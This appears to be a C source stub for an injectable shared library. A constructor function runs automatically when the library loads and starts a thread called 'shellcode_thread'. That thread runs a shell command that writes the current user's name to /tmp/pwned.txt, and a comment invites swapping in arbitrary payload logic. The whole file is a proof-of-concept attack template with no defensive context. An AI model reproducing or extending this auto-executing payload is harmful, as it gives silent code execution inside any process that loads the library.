#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>

void* shellcode_thread(void* arg) {
    system("/usr/bin/whoami > /tmp/pwned.txt"); // 🧪 Replace with your LUNE logic here
    return NULL;
}

__attribute__((constructor))
void start() {
    pthread_t thread;
    pthread_create(&thread, NULL, shellcode_thread, NULL);
}
